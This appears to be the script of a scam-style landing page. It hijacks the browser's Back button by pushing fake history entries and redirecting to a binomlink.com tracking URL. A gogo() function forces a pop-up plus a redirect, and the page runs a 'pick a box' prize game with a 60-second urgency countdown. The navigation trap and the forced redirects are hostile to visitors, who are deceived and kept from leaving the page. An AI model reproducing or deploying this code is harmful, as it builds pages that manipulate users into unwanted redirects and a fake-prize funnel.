// 定义余量基本功能
const cta   = "http://a03e53.binomlink.com/conv.php?lp=1";
const under = "http://a03e53.binomlink.com/conv.php?lp=1";
const bbr   = "http://a03e53.binomlink.com/conv.php?key=dx7ssumj25tcgj4qv450";

function gogo() {
    window.onbeforeunload = null;
    window.open(cta);
    document.location.assign(under);
}

(function() {
  var a;
  try {
    for (a = 0; a < 3; ++a) {
      history.pushState({}, "", "#");
    }
    window.onpopstate = function(event) {
      if (event.state) {
        location.replace(bbr);
      }
    };
  } catch (e) {
    // 捕获可能的错误
    console.error("Error occurred:", e);
  }
})();

document.addEventListener('DOMContentLoaded', function() {

//    var currentURL = window.location.href;
//    // 检查链接是否包含 lpkeys 参数
//    if (!currentURL.includes('lpkey')) {
//        // 如果 lpkeys 参数为空或者不存在，则跳转到 google.com
//        window.location.href = "https://www.alibaba.com/";
//    }

    document.addEventListener('click', function(event) {
        var target = event.target;

        if (target.classList.contains('open')) {
            target.classList.remove('open');
            target.classList.add('hd');
            var siblings = target.parentNode.children;
            for (var i = 0; i < siblings.length; i++) {
                if (siblings[i].classList.contains('da')) {
                    siblings[i].classList.remove('hd');
                }
            }

            var openElements = document.querySelectorAll('.open');
            openElements.forEach(function(element) {
                if (element !== target) {
                    element.classList.remove('open');
                    element.classList.add('open3');
                }
            });

            setTimeout(function() {
                document.getElementById("m1").classList.remove('hd');
                document.querySelector(".cover").classList.remove("hd");
            }, 500);
        }

        if (target.id === 'm1b') {
            document.getElementById("m1").remove();
            document.querySelector(".cover").classList.add("hd");
        }

        if (target.classList.contains('open3')) {
            target.classList.remove('open3');
            target.classList.add('hd');
            var siblings = target.parentNode.children;
            for (var i = 0; i < siblings.length; i++) {
                if (siblings[i].classList.contains('ph')) {
                    siblings[i].classList.remove('hd');
                }
            }

            setTimeout(function() {
                document.getElementById("m2").classList.remove('hd');
                document.querySelector(".cover").classList.remove("hd");

                var countdown = 60;
                var timer = setInterval(function() {
                    countdown--;
                    var formattedCountdown = countdown < 10 ? '0' + countdown : countdown;
                    document.getElementById("countdown").textContent = formattedCountdown;
                    
                    if (countdown <= 0) {
                        clearInterval(timer);
                        // 倒计时结束后的操作
                    }
                }, 1000);
            }, 500);
        }
    });

});
